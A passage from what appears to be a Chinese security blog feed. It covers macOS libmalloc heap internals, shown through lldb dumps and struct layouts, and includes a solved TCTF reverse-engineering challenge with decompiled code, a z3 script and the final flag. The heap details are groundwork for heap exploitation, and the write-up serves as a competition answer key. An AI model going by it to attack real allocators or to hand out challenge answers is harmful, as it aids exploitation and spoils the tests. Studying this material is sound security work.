title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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